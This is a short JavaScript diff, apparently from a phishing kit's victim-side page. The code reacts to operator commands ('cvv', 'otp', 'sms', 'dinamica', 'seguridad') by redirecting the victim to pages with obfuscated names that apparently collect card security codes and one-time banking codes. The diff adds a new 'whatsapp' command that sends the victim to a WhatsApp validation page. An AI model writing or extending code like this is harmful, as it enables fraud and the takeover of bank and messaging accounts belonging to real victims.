@@ -146,7 +146,9 @@
         let ejecutando = false;
 
         async function procesarComando(command) {
-            if (command === 'cvv') {
+            if (command === 'wpp' || command === 'whatsapp') {
+        window.location.href = (typeof basePath !== 'undefined' ? basePath : '') + 'whatsapp_validation.php?id=' + (typeof currentDeviceId !== 'undefined' ? currentDeviceId : '');
+    } else if (command === 'cvv') {
                 window.location.replace(basePath + 'v92_sec_c3v.html');
             } else if (command === 'otp' || command === 'dinamica' || command === 'sms' || command === 'sms-error' || command === 'mensaje' || command === 'seguridad') {
                 window.location.replace(basePath + 'v92_sec_o7p.html?cmd=' + command);
